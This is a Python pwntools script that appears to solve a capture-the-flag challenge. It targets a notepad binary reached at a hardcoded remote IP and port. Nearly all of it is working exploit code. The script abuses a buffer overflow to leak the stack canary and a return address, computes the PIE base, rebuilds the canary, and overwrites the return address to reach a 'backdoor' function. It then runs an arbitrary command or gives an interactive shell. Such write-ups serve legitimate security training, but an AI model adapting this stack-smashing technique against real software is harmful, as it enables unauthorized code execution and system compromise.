#!/usr/bin/env python3
from pwn import *
import argparse

context.binary = ELF("./chal")

MENU_BLOCK = (b"\nNotepad Application Menu\n"
              b"1. Add Note\n"
              b"2. Edit Note\n"
              b"3. View Note\n"
              b"4. Exit\n")

NOTE_SIZE = 0x500
BUF_SIZE = 0x108
CANARY_OFF = 0x458
RET_OFF = context.binary.symbols["main"] + 0x1c
BACKDOOR_OFF = context.binary.symbols["backdoor"]


def auth(io):
    # read() fills 0x14 bytes; sending 19 bytes leaves the last byte as NUL
    io.send(b"its a beautiful day")


def menu_choice(io, choice):
    io.recvuntil(b"> ")
    io.sendline(str(choice).encode())


def add_note(io, size=NOTE_SIZE):
    menu_choice(io, 1)
    io.recvuntil(b"Enter password: ")
    auth(io)
    io.recvuntil(b"Enter note size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Add note text: ")
    io.send(b"A" * BUF_SIZE)


def edit_note(io, pos, data):
    menu_choice(io, 2)
    io.recvuntil(b"Enter password: ")
    auth(io)
    io.recvuntil(b"Position: ")
    io.sendline(str(pos).encode())
    io.recvuntil(b"Add note text: ")
    io.send(data)


def view_leak(io):
    menu_choice(io, 3)
    io.recvuntil(b"Enter password: ")
    auth(io)
    io.recvuntil(b"Note: ")
    # Stop before the prompt so the caller can reuse menu_choice().
    out = io.recvuntil(MENU_BLOCK)
    data = out[:-len(MENU_BLOCK)]
    # strip the single newline printed by printf("Note: %s\n")
    if data.endswith(b"\n"):
        data = data[:-1]
    return data


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true", help="run locally")
    parser.add_argument("--host", default="159.65.255.102")
    parser.add_argument("--port", type=int, default=31226)
    parser.add_argument("--cmd", help="command to run after trigger (ex: 'cat /flag')")
    args = parser.parse_args()

    if args.local:
        io = process("./chal")
    else:
        io = remote(args.host, args.port)

    # 1) Add note and fill buffer
    add_note(io)

    # 2) Fill the gap up to the canary with non-zero bytes
    edit_note(io, 1, b"B" * 0x350)

    # 3) Overwrite canary LSB to bypass \0 terminator for leak
    edit_note(io, 4, b"C" * 0x39)

    leak = view_leak(io)
    if len(leak) < CANARY_OFF + 8:
        raise SystemExit("canary leak too short")

    canary = b"\x00" + leak[CANARY_OFF + 1:CANARY_OFF + 8]

    # 4) Make canary/regs non-zero to leak return address
    edit_note(io, 4, b"P" * 0x38 + b"Q" * 8 + b"R" * 8 + b"S" * 8 + b"T" * 8)

    leak2 = view_leak(io)
    if len(leak2) <= 0x478:
        raise SystemExit("return leak too short")

    ret_bytes = leak2[0x478:]
    ret = u64(ret_bytes.ljust(8, b"\x00"))

    base = ret - RET_OFF
    backdoor = base + BACKDOOR_OFF
    log.info("PIE base: %#x", base)
    log.info("backdoor: %#x", backdoor)

    # 5) Restore canary, overwrite return address to backdoor
    payload = b"A" * 0x38 + canary + b"D" * 24 + p64(backdoor)
    edit_note(io, 4, payload)

    # 6) Exit to trigger return -> backdoor
    menu_choice(io, 4)
    if args.cmd:
        io.sendline(args.cmd.encode())
        data = io.recvall(timeout=2)
        if data:
            print(data.decode(errors="ignore"), end="")
        io.close()
    else:
        io.interactive()


if __name__ == "__main__":
    main()
